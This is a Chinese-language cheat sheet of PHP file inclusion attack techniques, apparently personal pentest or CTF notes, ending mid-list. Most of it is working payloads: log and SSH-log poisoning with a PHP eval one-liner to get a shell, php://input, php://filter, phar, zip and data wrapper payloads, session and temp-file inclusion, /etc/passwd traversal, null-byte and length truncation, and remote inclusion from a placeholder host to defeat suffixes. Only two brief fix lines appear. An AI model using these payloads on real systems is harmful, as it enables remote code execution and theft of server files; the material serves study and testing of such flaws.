#   文件包含

-   ##  凡是被`include()`打开的文件，都会被php进行解析

-   include()：执行到include时才包含文件，找不到被包含文件时只会产生警告，脚本将继续执行
-   require()：只要程序一运行就包含文件，找不到被包含的文件时会产生致命错误，并停止脚本
-   include_once()和require_once()：若文件中代码已被包含则不会再次包含

-   ### **文件包含分为：本地文件包含、远程文件包含**

- # 一些姿势
- ##    本地包含配合apache日志拿shell
    - pache日志分为access.log与error.log，当我们请求一个url地址时，便会记录在access.log中，但如果访问一个不存在的页面，便会将这个页面写入access.log中。如访问URL:http://www.xxx.com/<?php eval([$_POST]);?>则会将一句话写入到access.log中，但是一般来说，写入到access.log文件中的一句话是被编码的，所以需要抓包绕过，而且利用此漏洞需要知道access.log的地址，不然便没有。
- ##    利用php协议进行包含
    - `http://www.test.com/index.php?file=data:text/plain,<?php phpinfo();?>%00`

-   ##  截断包含
    -   有些开发者为了防止本地包含漏洞，会编写一下代码:
        -   `<?php Include  $_GET['page'].".php"?>`
    -   此时就可以采取字符串截断：
        -   00截断包含
            -   这样的话比如上传一个1.jpg图片码，则访问http://www.xxx.com/1.jpg时，访问的是1.jgp.php，以为没有这个文件所以报错。这是，可以尝试访问http://www.xxx.com/1.jpg%00
        -   使用长目录截断
            -  ` ././././././././././././././etc/passwd
                    或者
                    ////////////////////////////etc/passwd
                    或者
                    ../a/etc/passwd/../a/etc/passwd/../a/etc/passwd`
    
-   ##  文件包含漏洞修复
    -   开启open_basedir函数，将其设置为指定目录，则只有该目录的文件允许被访问。
    -   关闭allow_url_include函数，防止远程文件包含。   


-   #   php伪协议
    -   ##   <font color="blue">php://input</font>
    
    -  ###    利用条件：
        -   allow_url_include = On。
        -   对allow_url_fopen不做要求。
    -   ###  实例：
        ```index.php
        ?file=php://input
        POST:
        <? phpinfo();?>
        ```
    -  ##    <font color="blue"> php://filter</font>
        -   利用条件：无甚
    -   实例：  
    `index.php? file=php://filter/read=convert.base64-encode/resource=index.php`
    `index.php?file=php://filter/convert.base64-encode/resource=index.php` 
    ---
    ##  [php://filter补充](#s)

    ---
    -   ##  <font color="blue">phar://</font>
        -   利用条件：  
            php版本大于等于php5.3.0
        -   实例
            -   假设有个文件phpinfo.txt，其内容为<?php phpinfo(); ?>，打包成zip压缩包，如下：  
            指定绝对路径`index.php?file=phar://D:/phpStudy/WWW/fileinclude/test.zip/phpinfo.txt`  
            或者使用相对路径（这里test.zip就在当前目录下）  
            `index.php?file=phar://test.zip/phpinfo.txt`   
    -   ##  <font color="blue">zip://</font>
        -   利用条件：  
            php版本大于等于php5.3.0
        -   实例
            -   构造zip包的方法同phar。
            -   但使用zip协议，需要指定绝对路径，同时将#编码为%23，之后填上压缩包内的文件。  
            `index.php?file=zip://D:\phpStudy\WWW\fileinclude\test.zip%23phpinfo.txt`
            -   若是使用相对路径，则会包含失败。
    -   ##  <font color="blue">data:URI schema</font>
        -   利用条件：  
            php版本大于等于php5.2  
            allow_url_fopen = On  
            allow_url_include = On  
        -   `index.php?file=data:text/plain,<?php phpinfo();?>`
        -   `index.php?file=data:text/plain;base64,PD9waHAgcGhwaW5mbygpOz8%2b`
            -   加号+的url编码为%2b，PD9waHAgcGhwaW5mbygpOz8+的base64解码为：<?php phpinfo();?>
          
-   #   包含session
    -   php的session文件的保存路径可以在phpinfo的session.save_path看到。
    -   常见的php-session存放位置：  
        /var/lib/php/sess_PHPSESSID  
        /var/lib/php/sess_PHPSESSID  
        /tmp/sess_PHPSESSID  
        /tmp/sessions/sess_PHPSESSID  
    -   session的文件名格式为sess_[phpsessid]。而phpsessid在发送的请求的cookie字段中可以看到。
-   #   包含日志
    -   ##  <font color="blue">访问日志</font>
        -   利用条件： 需要知道服务器日志的存储路径，且日志文件可读。
        -   很多时候，web服务器会将请求写入到日志文件中，比如说apache。在用户发起请求时，会将请求写入access.log，当发生错误时将错误写入error.log。默认情况下，日志保存路径在 /var/log/apache2/。
    -   ##  <font color="blue">SSH log</font>
        -   利用条件：需要知道ssh-log的位置，且可读。默认情况下为 /var/log/auth.log
        -   `ubuntu@VM-207-93-ubuntu:~$ ssh '<?php phpinfo(); ?>'@remotehost`
        -   之后会提示输入密码等等，随便输入。  
            然后在remotehost的ssh-log中即可写入php代码：  
            之后进行文件包含即可。
    -   ##  <font color="blue">包含environ</font>
        -   利用条件：  
            php以cgi方式运行，这样environ才会保持UA头。   
            environ文件存储位置已知，且environ文件可读。
        -   实例：  
            proc/self/environ中会保存user-agent头。如果在user-agent中插入php代码，则php代码会被写入到environ中。之后再包含它，即可。
    -   ##  <font color="blue">包含fd</font>
        -   跟包含environ类似。
    -   ##  <font color="blue">包含临时文件</font>
        -   php中上传文件，会创建临时文件。在linux下使用/tmp目录，而在windows下使用c:\winsdows\temp目录。在临时文件被删除之前，利用竞争即可包含该临时文件。
        -   由于包含需要知道包含的文件名。一种方法是进行暴力猜解，linux下使用的随机函数有缺陷，而window下只有65535中不同的文件名，所以这个方法是可行的。
        -   另一种方法是配合phpinfo页面的php variables，可以直接获取到上传文件的存储路径和临时文件名，直接包含即可。
    -   ##  <font color="blue">包含上传文件</font>
        -   利用条件：千变万化，不过至少得知道上传的文件在哪，叫啥名字。
-   #   <font color="red">绕过</font>
    -   ##  指定前缀
        ```php
        <?php
            $file = $_GET['file'];
            include '/var/www/html/'.$file;
        ?>
        ```
        -   利用../可以进行目录遍历
        -   编码绕过
    -   ##  指定后缀
        ```php
        <?php
            $file = $_GET['file'];
            include $file.'/test/test.php';
        ?>
        ```
        -  `protocol :// hostname[:port] / path / [;parameters][?query]#fragment`
        -  姿势一：query（？）
            -   `index.php?file=http://remoteaddr/remoteinfo.txt?`
            -    则包含的文件为 http://remoteaddr/remoteinfo.txt?/test/test.php  
            问号后面的部分/test/test.php，也就是指定的后缀被当作query从而被绕过。
        -   姿势二
            -   `index.php?file=http://remoteaddr/remoteinfo.txt%23`
            -   则包含的文件为    http://remoteaddr/remoteinfo.txt#/test/test.php     
            问号后面的部分/test/test.php，也就是指定的后缀被当作fragment从而  
            被绕过。注意需要把#进行url编码为%23。  
        -  利用协议
            -  `index.php?file=zip://D:\phpStudy\WWW\fileinclude\chybeta.zip%23chybeta`
            -  `则拼接后为：zip://D:\phpStudy\WWW\fileinclude\chybeta.zip#chybeta/test/test.php`   
        -  长度截断  
            利用条件： php版本 < php 5.2.8  
            目录字符串，在linux下4096字节时会达到最大值，在window下是256字节。只要不断的重复./  
            index.php?file=././././。。。省略。。。././shell.txt   
            则后缀/test/test.php，在达到最大值后会被直接丢弃掉。
        -   0字节截断
            -   利用条件： php版本 < php 5.3.4
            -   `index.php?file=phpinfo.txt%00`


##  <span id="s">  <font color="blue"> php://filter</font></span>
-   这是我们常常使用的一个伪协议，在任意文件读取，甚至getshell的时候都有利用的机会
-   php://filter 目标使用以下的参数作为它路径的一部分  

    名称	|描述
    --------|-------
    resource=<要过滤的数据流>  	|  这个参数是必须的。它指定了你要筛选过滤的数据流。
    read=<读链的筛选列表>	       |该参数可选。可以设定一个或多个过滤器名称，以管道符`（|）`分隔。
    write=<写链的筛选列表>	  | 该参数可选。可以设定一个或多个过滤器名称，以管道符`（|）`分隔。
    <；两个链的筛选列表>	     |  任何没有以 read= 或 write= 作前缀 的筛选器列表会视情况应用于读或写链。
-   我们举一个例子，这是平时我们用来任意文件读取的payload
    -   `php://filter/read=convert.base64-encode/resource=upload.php`
    -   这里读的过滤器为`convert.base64-encode`，就和字面上的意思一样，把输入流`base64-encode`。`resource=upload.php`，代表读取`upload.php`的内容
-   过滤器
    -   